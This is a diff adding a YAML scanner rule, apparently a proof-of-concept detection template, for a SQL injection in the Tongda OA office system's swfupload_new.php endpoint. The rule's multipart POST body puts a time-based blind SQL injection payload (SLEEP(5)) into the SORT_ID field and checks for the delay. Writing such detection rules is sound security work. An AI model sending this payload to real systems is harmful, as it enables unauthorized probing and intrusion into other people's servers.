@@ -1,0 +1,15 @@
+name: 通达OA-swfupload_new-sql
+description: >-
+  sql注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /general/file_folder/swfupload_new.php
+    headers:
+      Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
+    body: "------------GFioQpMK0vv2\r\nContent-Disposition: form-data; name=\"ATTACHMENT_ID\"\r\n\r\n1\r\n------------GFioQpMK0vv2\r\nContent-Disposition: form-data; name=\"ATTACHMENT_NAME\"\r\n\r\n1\r\n------------GFioQpMK0vv2\r\nContent-Disposition: form-data; name=\"FILE_SORT\"\r\n\r\n2\r\n------------GFioQpMK0vv2\r\nContent-Disposition: form-data; name=\"SORT_ID\"\r\n\r\n-@`'`  AND (SELECT 3397 FROM (SELECT(SLEEP(5)))jCdN)\r\n------------GFioQpMK0vv2--"
+    expression:
+      status: 200
+      sleep: 5
+      body_all: ["swfupload"]
